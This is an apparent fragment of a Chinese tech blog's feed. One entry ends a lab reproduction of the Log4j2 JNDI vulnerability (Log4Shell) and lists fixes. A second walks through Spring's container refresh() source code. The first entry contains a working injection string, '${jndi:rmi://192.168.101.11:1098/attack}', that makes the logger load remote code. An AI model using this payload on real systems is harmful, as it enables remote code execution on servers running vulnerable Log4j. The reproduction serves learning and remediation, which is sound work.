punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-log4j2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.5.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>准备一个简易的log4j.properties</p><figure><div class="code-wrapper"><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">log4j.rootLogger</span><span class="token punctuation">=</span><span class="token value attr-value">WARN, stdout</span><span class="token key attr-name">log4j.appender.stdout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.ConsoleAppender</span><span class="token key attr-name">log4j.appender.stdout.layout</span><span class="token punctuation">=</span><span class="token value attr-value">org.apache.log4j.PatternLayout</span><span class="token key attr-name">log4j.appender.stdout.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token value attr-value">%d %p [%c] - %m%n</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>controller如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kpy<span class="token punctuation">.</span>log4jtracktest<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2022/5/7 * @description: */</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"track"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrackController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TrackController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"进入服务"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:rmi://192.168.101.11:1098/attack&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>  System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);  该值为false所以就会跑出异常中止执行</p><p>在当前环境vm 打印出我们放在nginx 里面的伪代码，并且打开了计算器就算浮现成功</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220507233248474.png" alt="image-20220507233248474"></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>1、pom.xml中升级log4j的版本到2.15.0或者更高</p><figure><div class="code-wrapper"><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log4j2.version</span><span class="token punctuation">></span></span>2.15.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log4j2.version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>2、JDK 版本升级更高 JDK 11.0.1、8u191、7u201、6u211或者更高版本</p><p>3、采用logback记录日志，logback+slfj是一套非常优秀的解决方案</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring-(六)-容器刷新的十二大步</title>
    <link href="/posts/ad0cf685.html"/>
    <url>/posts/ad0cf685.html</url>
    
    <content type="html"><![CDATA[<p>容器刷新的12大步，分析主流程refresh()的12大步骤的具体事项</p><span id="more"></span><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalStateException</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>startupShutdownMonitor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">StartupStep</span> contextRefresh <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.refresh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare this context for refreshing.</span>      <span class="token comment">// 准备上下文环境信息</span>      <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Tell the subclass to refresh the internal bean factory.</span>      <span class="token comment">// 获取准备好的空容器</span>      <span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory <span class="token operator">=</span> <span class="token function">obtainFreshBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Prepare the bean factory for use in this context.</span>      <span class="token comment">// 准备Bean工厂信息</span>      <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Allows post-processing of the bean factory in context subclasses.</span>         <span class="token comment">// 后置处理Bean工厂</span>         <span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">StartupStep</span> beanPostProcess <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.context.beans.post-process"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Invoke factory processors registered as beans in the context.</span>         <span class="token comment">// 执行所有的 BeanFactoryPostProcessor，理由BeanFactory后置增强器对工厂进行修改或增强</span>         <span class="token function">invokeBeanFactoryPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Register bean processors that intercept bean creation.</span>         <span class="token comment">// 注册所有的bean的后置处理器</span>         <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         beanPostProcess<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize message source for this context.</span>         <span class="token comment">// 初始化国际化信息</span>         <span class="token function">initMessageSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize event multicaster for this context.</span>         <span class="token comment">//  初始化事件派发功能</span>         <span class="token function">initApplicationEventMulticaster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Initialize other special beans in specific context subclasses.</span>         <span class="token comment">// 留给子类继续增强</span>         <span class="token function">onRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Check for listener beans and register them.</span>         <span class="token comment">// 注册监听器</span>         <span class="token function">registerListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Instantiate all remaining (non-lazy-init) singletons.</span>         <span class="token comment">// 完成Bean工厂 的初始化</span>         <span class="token function">finishBeanFactoryInitialization</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Last step: publish corresponding event.</span>         <span class="token comment">// 最后一些清理、事件派发功能</span>         <span class="token function">finishRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isWarnEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"Exception encountered during context initialization - "</span> <span class="token operator">+</span>                  <span class="token string">"cancelling refresh attempt: "</span> <span class="token operator">+</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token comment">// Destroy already created singletons to avoid dangling resources.</span>         <span class="token function">destroyBeans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Reset 'active' flag.</span>         <span class="token function">cancelRefresh</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Propagate exception to caller.</span>         <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Reset common introspection caches in Spring's core, since we</span>         <span class="token comment">// might not ever need metadata for singleton beans anymore...</span>         <span class="token function">resetCommonCaches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         contextRefresh<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="第一步：prepareRefresh"><a href="#第一步：prepareRefresh" class="headerlink" title="第一步：prepareRefresh"></a>第一步：prepareRefresh</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">prepareRefresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Switch to active.</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>startupDate <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>closed<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>active<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Refreshing "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Refreshing "</span> <span class="token operator">+</span> <span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Initialize any placeholder property sources in the context environment.</span>   <span class="token comment">// 初始化属性源 （web应用就是在此将servlet 信息加载）</span>   <span class="token function">initPropertySources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Validate that all properties marked as required are resolvable:</span>   <span class="token comment">// see ConfigurablePropertyResolver#setRequiredProperties</span>   <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">validateRequiredProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Store pre-refresh ApplicationListeners...</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationListeners <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationListeners <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationListeners<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Reset local application listeners to pre-refresh state.</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>applicationListeners<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>applicationListeners<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationListeners<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Allow for the collection of early ApplicationEvents,</span>   <span class="token comment">// to be published once the multicaster is available...</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>earlyApplicationEvents <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>准备上下文信息：初始化一些属性值 以及准备一些环境变量信息environment</p><p>PS:web应用就是在此将servlet 信息加载</p><h2 id="第二步：obtainFreshBeanFactory"><a href="#第二步：obtainFreshBeanFactory" class="headerlink" title="第二步：obtainFreshBeanFactory"></a>第二步：obtainFreshBeanFactory</h2><p>获取在this阶段创建好的 factory对象。</p><p>PS:xml的方式会在此时进行xml信息读取</p><h2 id="第三步：prepareBeanFactory"><a href="#第三步：prepareBeanFactory" class="headerlink" title="第三步：prepareBeanFactory"></a>第三步：prepareBeanFactory</h2><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">prepareBeanFactory</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// Tell the internal bean factory to use the context's class loader etc.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">setBeanClassLoader</span><span class="token punctuation">(</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>shouldIgnoreSpel<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setBeanExpressionResolver</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StandardBeanExpressionResolver</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">addPropertyEditorRegistrar</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceEditorRegistrar</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Configure the bean factory with context callbacks.</span>   <span class="token comment">//准备了一个处理xxxAware的后置处理器</span>   beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ApplicationContextAwareProcessor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">EnvironmentAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">EmbeddedValueResolverAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">ResourceLoaderAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">ApplicationEventPublisherAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">MessageSourceAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">ApplicationContextAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">ignoreDependencyInterface</span><span class="token punctuation">(</span><span class="token class-name">ApplicationStartupAware</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// BeanFactory interface not registered as resolvable type in a plain factory.</span>   <span class="token comment">// MessageSource registered (and found for autowiring) as a bean.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">registerResolvableDependency</span><span class="token punctuation">(</span><span class="token class-name">BeanFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">registerResolvableDependency</span><span class="token punctuation">(</span><span class="token class-name">ResourceLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">registerResolvableDependency</span><span class="token punctuation">(</span><span class="token class-name">ApplicationEventPublisher</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   beanFactory<span class="token punctuation">.</span><span class="token function">registerResolvableDependency</span><span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Register early post-processor for detecting inner beans as ApplicationListeners.</span>   beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ApplicationListenerDetector</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Detect a LoadTimeWeaver and prepare for weaving, if found.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">NativeDetector</span><span class="token punctuation">.</span><span class="token function">inNativeImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> beanFactory<span class="token punctuation">.</span><span class="token function">containsBean</span><span class="token punctuation">(</span><span class="token constant">LOAD_TIME_WEAVER_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LoadTimeWeaverAwareProcessor</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Set a temporary ClassLoader for type matching.</span>      beanFactory<span class="token punctuation">.</span><span class="token function">setTempClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContextTypeMatchClassLoader</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">.</span><span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Register default environment beans.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">ENVIRONMENT_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">ENVIRONMENT_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_PROPERTIES_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_PROPERTIES_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSystemProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_ENVIRONMENT_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_ENVIRONMENT_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSystemEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>beanFactory<span class="token punctuation">.</span><span class="token function">containsLocalBean</span><span class="token punctuation">(</span><span class="token constant">APPLICATION_STARTUP_BEAN_NAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      beanFactory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token constant">APPLICATION_STARTUP_BEAN_NAME</span><span class="token punctuation">,</span> <span class="token function">getApplicationStartup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 